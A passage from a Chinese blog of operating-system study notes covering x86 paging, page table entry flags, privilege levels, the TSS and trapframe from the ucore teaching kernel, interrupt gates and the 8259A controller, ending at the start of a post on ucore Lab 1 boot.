<h2 id="获取物理内存容量"><a href="#获取物理内存容量" class="headerlink" title="获取物理内存容量"></a>获取物理内存容量</h2><p>Linux 有多种办法可以获取内存容量，如果一种方式失效，它就会尝试其他办法</p>
<p>在 Linux 2.6 内核中，是用 detect_memory 函数来获取内存容量的，其函数在本质上是通过调用 BIOS 中断 0x15 实现的，分别是 BIOS 中断 0x15 的3个子功能，子功能号要存放到寄存器 EAX AX 中，如下：</p>
<ul>
<li>EAX=0xE820：遍历主机上全部内存</li>
<li>AX=0xE801：分别检测低 15MB 和 16MB ~ 4GB 的内存，最大支持 4GB</li>
<li>AH=0x88：最多检测出 64MB 内存，如果实际内存超过此容量也按照 64MB 返回 </li>
</ul>
<h2 id="分页机制"><a href="#分页机制" class="headerlink" title="分页机制"></a>分页机制</h2><p>分页机制是基于分段机制诞生的，它的目的是为了解决分段机制的不足之处：</p>
<ul>
<li>在保护模式中段寄存器中的内容己经是段选择子，但段选择子最终就是为了要找到段基址，其内存访问的核心机制依然是“段基址：段内偏移地址”，这两个地址在相加之后才是绝对地址，也就是我们所说的线性地址</li>
<li>此线性地址在分段机制下被 CPU 认为是物理地址，直接拿来就能用，也就是说，此线性地址可以直接送上地址总线</li>
<li>这种线性地址与物理地址一一对应的关系不利于 CPU 对多任务的控制（因为 CPU 必须使用连续的内存块来加载程序，而一些细小的内存块则难以利用）</li>
</ul>
<p>分页机制的关键点就是：</p>
<ul>
<li>解除线性地址与物理地址一一对应的关系</li>
<li>然后将它们的关系通过某种映射关系重新建立，可以将线性地址映射到任意物理地址</li>
</ul>
<p>分页机制的作用有两方面：</p>
<ul>
<li>将线性地址转换成物理地址</li>
<li>用大小相等的页代替大小不等的段</li>
</ul>
<img src="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/1649750602645.png" class width="1649750602645"> 
<img src="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/1649750359767.png" class width="1649750359767"> 
<ul>
<li>CPU 在不打开分页机制的情况下，是按照默认的分段方式进行的，段基址和段内偏移地址经过段部件处理后所输出的线性地址，CPU 就认为是物理地址</li>
<li>如果打开了分页机制，段部件输出的线性地址就不再等同于物理地址了，我们称之为虚拟地址，它是逻辑上的，是假的，不应该被送上地址总线</li>
<li>CPU 必须要拿到物理地址才行，此虚拟地址对应的物理地址需要在页表中查找，这项查找工作是由页部件自动完成的</li>
</ul>
<p>为了要搞清楚页部件的工作原理，必须要搞清楚这两件事：</p>
<ul>
<li>分页机制的原理</li>
<li>页表的结构</li>
</ul>
<p><strong>一级页表</strong></p>
<p>页是地址空间的计量单位，并不是专属物理地址或线性地址，只要是 4KB 的地址空间都可以称为一 页，所以线性地址的一页也要对应物理地址的一页</p>
<p>一页大小为 4KB ，这样一来，4GB 地址空间被划分 4GB/4KB=1M 个页，也就是 4GB 空间中可以容纳 1048576 个页，页表中自然也要有 1048576 个页表项，这就是我们要说的一级页表</p>
<img src="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/1649751824877.png" class width="1649751824877"> 
<ul>
<li>其实一级页表就是把 4GB 的物理内存拆分为 1M 个 4KB 的内存页</li>
<li>然后操作系统会根据页表的顺序重新编排一个虚拟地址提供给每个进程，使其可以索引到分配给自己的物理内存<ul>
<li>对于各个进程来说：<ul>
<li>进程看到的，使用的，就是一段连续的 4GB 虚拟地址</li>
<li>好像每个进程都在单独使用计算机的内存空间一样</li>
</ul>
</li>
<li>对于操作系统来说：<ul>
<li>操作系统看到的，是各个进程都在使用物理内存上不连续的内存块</li>
<li>而操作系统的任务就是，把这些不连续的物理内存块整合成页表，提供给各个进程</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>当计算机采用一级页表进行内存管理时：</p>
<ul>
<li>系统分配出连续的 1K 个内存页，用于充当页表</li>
<li>有一个专门的寄存器来存放页表的地址（CPU不同，寄存器不同）</li>
</ul>
<p>一级页表的转换过程：</p>
<ul>
<li>根据线性地址，获取页表项索引和物理页内偏移</li>
<li>根据固定寄存器获取页表的物理地址，然后通过索引获取对应的页表项</li>
<li>页表项里面装有对应的物理页地址</li>
<li>最后通过物理页内偏移计算出具体的物理地址</li>
</ul>
<p><strong>一级页表的局限</strong></p>
<ul>
<li>一级页表中的所有表项必须要提前建好，原因是操作系统要占用 4GB 虚拟地址空间的高 1GB ，用户进程占用低 3GB，每个进程都有自己的页表，进程越多，页表占用空间越大</li>
<li>根据局部性原理可知，很多时候，进程在一段时间内只需要访问某几个页面就可以正常运行了，因此也没有必要让整个页面都常驻内存</li>
<li>有时候，我们希望页表在我们需要的时候动态增加，不需要一次性建立好</li>
</ul>
<p>对应的解决方案就是二级页表</p>
<p><strong>二级页表</strong></p>
<p>无论是几级页表，标准页的尺寸都是 4KB，所以 4GB 线性地址空间最多有 1M 个标准页</p>
<ul>
<li>一级页表是将这 1M 个标准页放置到一张页表中：<ul>
<li>导致这一张页表很大，还必选占用连续的内存空间（连续 1K 个标准页）</li>
<li>并且每个进程都需要一张这个页表</li>
</ul>
</li>
<li>二级页表是将这 1M 个标准页平均放置 1K 个页表中：<ul>
<li>每个页表的大小减少了，并且不需要占用连续的内存空间</li>
<li>需要建立一张页表，用来统一管理这些不连续的页表（称为页目录表，或外层页表，或顶层页表）</li>
</ul>
</li>
</ul>
<p>具体的“平均放置”过程：</p>
<ul>
<li>将长长的页表进行分组，使每个页面中刚好可以放下一个分组：每个页表项4B，所以每个页面中可以存放1K（1024）个页表项，因此每1K个连续的页表项为一组，每组刚好占一个页面</li>
</ul>
<img src="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/1649850553506.png" class width="1649850553506">  
<p>以32位逻辑地址空间的分页系统为例：</p>
<ul>
<li>如果采用一级页表，那么页表所占用的内存空间是1MB，而且必须是连续的</li>
<li>现在我们将页表等分成1024份，即产生了1024个页面，并且每个页面有1024个表项（每个表项1B，即每个页面1KB），存储的是页号与物理块号的映射关系</li>
<li>然后我们建立外层页表，由于有1024个页面，所以外层页表有1024个表项（每个表项1B，外层页表1KB），存储的是各个页面的首地址</li>
<li>这样我们就实现了一个两级页表，由于两级页表采用了离散分配的方式，外层页表和每个表项所对应的页面分别存储在不同的物理块中，解决了需要连续存储的问题</li>
</ul>
<p>当计算机采用二级页表进行内存管理时：</p>
<ul>
<li>页目录表（Page Directory Table，PDT）装有最多 1KB 个页目录表项（页目录表条目）<ul>
<li>页目录表：一级页表</li>
<li>页目录表项：二级页表</li>
<li>相当于在一级页表中装有二级页表</li>
</ul>
</li>
<li>每个页目录表项（Page Table Entry，PTE）都装有最多 1KB 个表项<ul>
<li>每个表项都指向一个物理页（和一级页表的情况相同）</li>
<li>此时二级页表就担当起原来一级页表的工作</li>
</ul>
</li>
</ul>
<p>二级页表的转换过程：</p>
<ul>
<li>根据线性地址，获取页目录表项索引，页表项索引和物理页内偏移</li>
<li>根据固定寄存器获取页目录表的物理地址，然后通过页目录表项索引获取对应的页目录表项</li>
<li>页目录表项存放着二级页表的物理地址</li>
<li>通过页表项索引获取对应的二级页表项</li>
<li>二级页表项中存放着对应的物理页地址</li>
<li>最后通过物理页内偏移计算出具体的物理地址</li>
</ul>
<h2 id="页表结构"><a href="#页表结构" class="headerlink" title="页表结构"></a>页表结构</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* page table/directory entry flags */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_P           0x001                   <span class="comment">// Present</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_W           0x002                   <span class="comment">// Writeable</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_U           0x004                   <span class="comment">// User</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_PWT         0x008                   <span class="comment">// Write-Through</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_PCD         0x010                   <span class="comment">// Cache-Disable</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_A           0x020                   <span class="comment">// Accessed</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_D           0x040                   <span class="comment">// Dirty</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_PS          0x080                   <span class="comment">// Page Size</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_MBZ         0x180                   <span class="comment">// Bits must be zero</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_AVAIL       0xE00                   <span class="comment">// Available for software use</span></span></span><br><span class="line">                                                </span><br><span class="line"><span class="comment">// The PTE_AVAIL bits aren&#x27;t used by the kernel or interpreted by the hardware, so user processes are allowed to set them arbitrarily.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_USER        (PTE_U | PTE_W | PTE_P) <span class="comment">// Offset</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>0 - <strong>P</strong>resent：表示当前PTE所指向的物理页面是否驻留在内存中</li>
<li>1 - <strong>W</strong>riteable：表示是否允许读写</li>
<li>2 - <strong>U</strong>ser：表示该页的访问所需要的特权级（即User(ring 3)是否允许访问）</li>
<li>3 - <strong>P</strong>ageWriteThough：表示是否使用write through缓存写策略</li>
<li>4 - <strong>P</strong>ageCacheDisable：表示是否 <strong>不对</strong> 该页进行缓存</li>
<li>5 - <strong>A</strong>ccess：表示该页是否已被访问过</li>
<li>6 - <strong>D</strong>irty：表示该页是否已被修改</li>
<li>7 - <strong>P</strong>ageSize：表示该页的大小</li>
<li>8 - <strong>M</strong>ustBeZero：该位必须保留为0</li>
<li>9-11 - <strong>A</strong>vailable：第9-11这三位并没有被内核或中断所使用，可保留给OS使用</li>
<li>12-31 - <strong>O</strong>ffset：目标地址的后20位</li>
</ul>
<h2 id="线性地址结构"><a href="#线性地址结构" class="headerlink" title="线性地址结构"></a>线性地址结构</h2><img src="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/1649860246487.png" class width="1649860246487"> 
<p>线性地址（linear address）也称虚拟地址virtual address：是一个32位无符号整数，用来表示高达4GB的地址</p>
<p>一级页表：</p>
<ul>
<li>线性地址的高20位在页表中索引页表项</li>
<li>线性地址的低12位与页表项中的物理地址相加，所求的和便是最终线性地址对应的物理地址</li>
</ul>
<p>二级页表：</p>
<ul>
<li>线性地址的高10位（第31~22位）用来在页目录中定位一个页表<ul>
<li>也就是这高10位用于定位页目录中的<strong>页目录项 PDE</strong></li>
<li>PDE 中有页表物理页地址</li>
</ul>
</li>
<li>线性地址的中间10位（第 21~12位）用来在页表中定位具体的物理页 <ul>
<li>也就是在页表中定位一个<strong>页表项 PTE</strong></li>
<li>PTE 中有分配的物理页地址</li>
</ul>
</li>
<li>余下的12位（第11~0位）用于页内偏移量</li>
</ul>
<p>注意：</p>
<ul>
<li>页目录表（一级页表）内存放二级页表的 <strong>物理地址</strong> ，但却使用 <strong>线性地址</strong> 索引页目录表中的条目</li>
<li>构成线性地址的各个部分都是 <strong>偏移或索引</strong></li>
</ul>
<h2 id="特权级别简述"><a href="#特权级别简述" class="headerlink" title="特权级别简述"></a>特权级别简述</h2><p>特权级别（Privilege Level）是存在于 Descriptor（描述符）及 Segment Selector（段选择子，存储在段寄存器以及门描述符中） 中一个数值，当这些 Descriptor 或 Segment Selector 要进行某些操作，或者被别的对象访问时，该数值用于控制它们能够进行的操作或者限制它们的可访问性</p>
<p>特权级共分为四档，分别为0-3：</p>
<ul>
<li>Kernel为第0特权级（ring 0）</li>
<li>用户程序为第3特权级（ring 3）</li>
<li>操作系统保护分别为第1和第2特权级</li>
</ul>
<p><strong>描述符特权级（DPL，Descriptor Privilege Level）</strong></p>
<ul>
<li>实施特权级保护的第一步，是为所有可管理的对象赋予一个特权级，以决定谁能访问它们，每个 Descriptor 都具有描述符特权级（DPL，Descriptor Privilege Level）字段，Descriptor 总是指向它所“描述”的目标对象，代表着该对象，因此该字段（DPL）实际上是目标对象的特权级</li>
<li>存储于段描述符中：</li>
</ul>
<img src="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/1649146076621.png" class width="1649146076621"> 
<p><strong>当前特权级（CPL，Current Privilege Level）</strong></p>
<ul>
<li>当处理器正在一个代码段中取指令和执行指令时，那个代码段的特权级叫做当前特权级（CPL，Current Privilege Level），正在执行的这个代码段，其选择子位于段寄存器CS中，其最低两位就是当前特权级的数值</li>
<li>存储于CS寄存器的段选择子中（CS中的DPL就是CPL）：</li>
</ul>
<img src="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/1649146195666.png" class width="1649146195666"> 
<p><strong>请求特权级（RPL，Request Privilege Level）</strong></p>
<ul>
<li>我们知道，要将控制从一个代码段转移到另一个代码段，通常是使用 <code>jmp</code> 和 <code>call</code> 指令，并在指令中提供目标代码段的选择子，以及段内偏移量(入口点)，而为了访问内存中的数据，也必须先将段选择子加载到段寄存器DS、ES、FS或者GS中，不管是实施控制转移，还是访问数据段，这都可以看成是一个请求，请求者提供一个段选择子，请求访问指定的段，从这个意义上来说，RPL也就是指请求者的特权级别（RPL，Request Privilege Level）</li>
<li>存储于段选择子中：（段选择子存储于各个段寄存器以及门描述符中：调用门、任务门、中断门、陷阱门）</li>
</ul>
<img src="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/1649146143417.png" class width="1649146143417"> 
<p><strong>输出特权级（IOPL，I/O Privilege Level）</strong></p>
<ul>
<li>除了那些特权级敏感的指令外，处理器还允许对各个特权级别所能执行的I/O操作进行控制，通常，这指的是端口访问的许可权，因为对设备的访问都是通过端口进行的</li>
<li>在处理器的标志寄存器EFLAGS中，位13、位12是IOPL位，也就是输入/输出特权级（IOPL，I/O Privilege Level），它代表着当前任务的I/O特权级别，某些指令，例如 IN，OUT，CLI 需要 I/O 特权，这些操作根据 IOPL 和 CPL 确定合法性</li>
<li>存储于EFLAGS中： </li>
</ul>
<img src="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/1649146429816.png" class width="1649146429816">  
<h2 id="特权级别运用"><a href="#特权级别运用" class="headerlink" title="特权级别运用"></a>特权级别运用</h2><p><strong>特权级检查</strong></p>
<p>在下述的特权级比较中，需要注意特权级越低，其ring值越大：</p>
<ul>
<li>访问门时（中断、陷入、异常），要求 <strong>DPL[段] &lt;= CPL &lt;= DPL[门]</strong> （ring值比较）<ul>
<li>访问门的代码权限比门的特权级要高，因为这样才能访问门（CPL &lt;= DPL[门]）</li>
<li>但访问门的代码权限比被访问的段的权限要低，因为通过门的目的是访问特权级更高的段，这样就可以达到低权限应用程序使用高权限内核服务的目的（CPL &lt;= DPL[门]）</li>
<li>简述：代码权限低于段权限时，可以通过访问门的方式来访问段</li>
</ul>
</li>
<li>访问段时，要求 <strong>DPL[段] &gt;= max {CPL, RPL}</strong> （ring值比较）<ul>
<li>只能使用最低的权限来访问段数据</li>
<li>简述：请求权限与当前权限只要有一个低于段权限，就会导致访问失败</li>
</ul>
</li>
</ul>
<p><strong>特权级切换</strong></p>
<p><strong>TSS</strong></p>
<p>TSS（Task State Segment）是操作系统在进行进程切换时保存进程现场信息的段，其结构如下：</p>
<img src="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/1649147399799.png" class width="1649147399799"> 
<ul>
<li>TSS中分别保留了 ring0、ring1、ring2 的栈，当用户程序从 ring3 跳至 ring0 时（例如执行中断），此时的栈就会从用户栈切换到内核栈，切换栈的操作从开始中断的那一瞬间就已完成（例如：从<code>int 0x78</code>到中断处理例程之间）</li>
<li>TSS段的段描述符保存在GDT中，其 ring0 的栈会在初始化GDT时被一起设置，<code>TR</code> 寄存器会保存当前TSS的段描述符，以提高索引速度</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">segdesc</span> <span class="title">gdt</span>[] =</span> &#123;</span><br><span class="line">    SEG_NULL,</span><br><span class="line">    [SEG_KTEXT] = SEG(STA_X | STA_R, <span class="number">0x0</span>, <span class="number">0xFFFFFFFF</span>, DPL_KERNEL),</span><br><span class="line">    [SEG_KDATA] = SEG(STA_W, <span class="number">0x0</span>, <span class="number">0xFFFFFFFF</span>, DPL_KERNEL),</span><br><span class="line">    [SEG_UTEXT] = SEG(STA_X | STA_R, <span class="number">0x0</span>, <span class="number">0xFFFFFFFF</span>, DPL_USER),</span><br><span class="line">    [SEG_UDATA] = SEG(STA_W, <span class="number">0x0</span>, <span class="number">0xFFFFFFFF</span>, DPL_USER),</span><br><span class="line">    [SEG_TSS]   = SEG_NULL,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">pseudodesc</span> <span class="title">gdt_pd</span> =</span> &#123;</span><br><span class="line">      <span class="keyword">sizeof</span>(gdt) - <span class="number">1</span>, (<span class="keyword">uintptr_t</span>)gdt</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* gdt_init - initialize the default GDT and TSS */</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function">  <span class="title">gdt_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 设置TSS的ring0栈地址，包括esp寄存器和SS段寄存器</span></span><br><span class="line">      load_esp0((<span class="keyword">uintptr_t</span>)bootstacktop);</span><br><span class="line">      ts.ts_ss0 = KERNEL_DS;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 将TSS写入GDT中</span></span><br><span class="line">      gdt[SEG_TSS] = SEGTSS(STS_T32A, (<span class="keyword">uintptr_t</span>)&amp;ts, <span class="keyword">sizeof</span>(ts), DPL_KERNEL);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 加载GDT至GDTR寄存器</span></span><br><span class="line">      lgdt(&amp;gdt_pd);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 加载TSS至TR寄存器</span></span><br><span class="line">      ltr(GD_TSS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>trapFrame</strong></p>
<p>trapframe 结构是进入中断门所必须的结构，中断处理例程的入口代码用于保存上下文并构建一个 trapframe</p>
<p>trapframe 的结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> &#123;</span></span><br><span class="line">    <span class="comment">// tf_regs保存了基本寄存器的值，包括eax,ebx,esi,edi寄存器等等</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pushregs</span> <span class="title">tf_regs</span>;</span></span><br><span class="line">    <span class="keyword">uint16_t</span> tf_gs;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding0;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_fs;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding1;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_es;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding2;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_ds;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding3;</span><br><span class="line">    <span class="keyword">uint32_t</span> tf_trapno;</span><br><span class="line">    <span class="comment">// 以下这些信息会被CPU硬件自动压入切换后的栈。包括下面切换特权级所使用的esp、ss等数据</span></span><br><span class="line">    <span class="keyword">uint32_t</span> tf_err;</span><br><span class="line">    <span class="keyword">uintptr_t</span> tf_eip;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_cs;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding4;</span><br><span class="line">    <span class="keyword">uint32_t</span> tf_eflags;</span><br><span class="line">    <span class="comment">// 以下这些信息会在切换特权级时被使用</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> tf_esp;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_ss;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding5;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure>
<p><strong>切换特权级的过程</strong></p>
<ul>
<li>特权级提升<ul>
<li>在陷入的一瞬间，CPU会因为特权级的改变，索引TSS，切换 <code>ss</code> 和 <code>esp</code> 为内核栈，并按顺序自动压入<code>user_ss</code>、<code>user_esp</code>、<code>user_eflags</code>、<code>user_cs</code>、<code>old_eip</code>以及<code>err</code></li>
<li>之后CPU会在中断处理例程入口处，先将剩余的段寄存器以及所有的通用寄存器压栈，构成一个 <code>trapframe</code> ，然后将该 <code>trapframe</code> 传入给真正的中断处理例程并执行</li>
<li>该处理例程会判断传入的中断数(<code>trapno</code>)并执行特定的代码，在提升特权级的代码中，程序会处理传入的 <code>trapframe</code> 信息中的 <code>CS、DS、eflags</code> 寄存器，修改上面的 DPL、CPL与IOPL 以达到提升特权的目的</li>
<li>将修改后的 <code>trapframe</code> 压入用户栈（这一步没有修改 <code>user_esp</code> 寄存器），并设置中断处理例程结束后将要弹出 <code>esp</code> 寄存器的值为用户栈的新地址（与刚刚不同，这一步修改了将要恢复的 <code>user_esp</code> 寄存器）</li>
<li>在内核中，“将修改后的trapframe压入用户栈”这一步，需要舍弃 <code>trapframe</code> 中末尾两个旧的<code>ss</code>和<code>esp</code>寄存器数据</li>
</ul>
</li>
<li>特权级降低<ul>
<li>与 ring3 调用中断不同，当 ring0 调用中断时，进入中断前和进入中断后的这个过程，栈不发生改变</li>
<li>修改后的 <code>trapFrame</code> 不需要像上面那样保存至将要使用的栈，因为当前环境下 <code>iret</code> 前后特权级会发生改变，执行该命令会弹出 <code>ss</code> 和 <code>esp</code> ，所以可以通过 <code>iret</code> 来设置返回时的栈地</li>
</ul>
</li>
</ul>
<h2 id="中断描述符表"><a href="#中断描述符表" class="headerlink" title="中断描述符表"></a>中断描述符表</h2><p>中断描述符表（Interrupt Descriptor Table, IDT ）是保护模式下用于存储中断处理程序入口的表，当 CPU 接收一个中断时，需要用中断向量在此表中检索对应的描述符，在该描述符中找到中断处理程序的起始地址，然后执行中断处理程序</p>
<p>实模式下用于存储中断处理程序入口的表叫中断向量表（Interrupt Vector Table，IVT）</p>
<p>在计算机中，用门来表示一段程序的入口：</p>
<ul>
<li>任务门<ul>
<li>任务门和任务状态段（Task Status Segment，TSS）是 Intel 处理器在硬件一级提供的任务切换机制，所以任务门需要和 TSS 配合在一起使用，在任务门中记录的是 TSS 选择子，（偏移量未使用）</li>
<li>任务门可以存在于全局描述符表 GDT，局部描述符表 LDT，中断描述符表 IDT 中</li>
</ul>
</li>
<li>中断门<ul>
<li>中断门包含了中断处理程序所在段的段选择子和段内偏移地址，当通过此方式进入中断后，标志寄存 eflags 中的IF位自动置 0（也就是在进入中断后，自动把中断关闭，避免中断嵌套）</li>
<li>Linux 就是利用中断门实现的系统调用（就是那个著名的 int 0x80）</li>
<li>中断门只允许存在于中断描述符表 IDT 中</li>
</ul>
</li>
<li>陷阱门<ul>
<li>陷阱门和中断门非常相似，区别是由陷阱门进入中断后，标志寄存器 eflags 中的IF位不会自动置 0</li>
<li>陷阱门只允许存在于中断描述符表 IDT 中 </li>
</ul>
</li>
<li>调用门<ul>
<li>调用门是提供给用户进程进入 ring0 特权级的方式</li>
<li>调用门中将记录例程的地址，并且它不能用 int 指令调用，只能用 call 和 jmp 指令</li>
<li>调用门可以安装在全局描述符表 GDT，局部描述符表 LDT 中</li>
</ul>
</li>
</ul>
<h2 id="可编程中断控制器-8259A"><a href="#可编程中断控制器-8259A" class="headerlink" title="可编程中断控制器 8259A"></a>可编程中断控制器 8259A</h2><p>任务是串行在 CPU 上执行的， CPU 每次只能执行一个任务，如果同时有多个外设发出中断，而 CPU 只能先处理一个</p>
<p>可编程中断控制器 8259A 就可以作为中断代理，决定哪个中断优先被 CPU 受理</p>
<img src="/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/1649763643638.png" class width="1649763643638"> 

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/09/Ucore-Lab1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/09/Ucore-Lab1/" class="post-title-link" itemprop="url">Ucore-Lab1</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-04-09 17:23:13" itemprop="dateCreated datePublished" datetime="2022-04-09T17:23:13+08:00">2022-04-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-16 23:42:48" itemprop="dateModified" datetime="2023-03-16T23:42:48+08:00">2023-03-16</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>27k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>24 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="x86启动顺序"><a href="#x86启动顺序" class="headerlink" title="x86启动顺序"></a>x86启动顺序</h2><p>对于绝大多数计算机系统而言，操作系统和应用软件是存放在磁盘（硬盘/软盘）、光盘、EPROM、ROM、Flash等可在掉电后继续保存数据的存储介质上， 当计算机加电后，一般不直接执行操作系统，而是一开始会 <strong>到一个特定的地址开始执行指令</strong> ，这个特定的地址 <strong>存放了系统初始化软件</strong> ，通过执行系统初始化软件（可固化在ROM或Flash中，也称firmware，固件）完成基本I/O初始化和引导加载操作系统的功能 </p>
<p>以基于Intel 80386的计算机为例，计算机加电后，整个物理地址空间如下图所示： </p>
<img src="/2022/04/09/Ucore-Lab1/1647232593796.png" class width="1647232593796">  
<p><strong>第一条指令</strong></p>
<p>算机加电后，代码段寄存器 CS=0xF000h，指令指针寄存器 EIP=FFF0h，所以执行的第一条指令地址为 BASE+EIP=FFFF0000h+0000FFF0h=FFFFFFF0h ，这是BIOS的EPROM所在地（只读） </p>
<p>通常第一条指令是一条长跳指令，这样CS和EIP都会更新到BIOS代码中执行</p>
<p>启动qemu并让其停到执行第一条指令前，这需要增加一个参数”-S” ：</p>
